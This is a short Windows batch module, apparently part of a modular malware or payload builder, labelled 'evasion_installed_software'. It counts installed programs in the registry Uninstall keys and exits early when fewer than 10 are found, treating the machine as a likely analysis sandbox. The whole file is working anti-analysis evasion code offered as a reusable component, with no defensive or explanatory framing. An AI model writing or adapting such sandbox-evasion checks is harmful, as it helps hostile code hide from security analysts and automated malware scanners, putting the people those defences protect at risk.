REM provides: evasion_installed_software
REM depends: (none)
REM description: Count installed software to detect minimal sandbox environments

REM Real workstations typically have 30+ installed programs
set "SW_COUNT=0"
for /f %%c in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" 2^>nul ^| find /c "HKEY"') do (
    set "SW_COUNT=%%c"
)

REM Also check 32-bit programs on 64-bit OS
set "SW_COUNT2=0"
for /f %%c in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" 2^>nul ^| find /c "HKEY"') do (
    set "SW_COUNT2=%%c"
)

set /a "TOTAL_SW=%SW_COUNT% + %SW_COUNT2%"

REM Less than 10 installed programs = likely sandbox
if %TOTAL_SW% LSS 10 exit /b 0
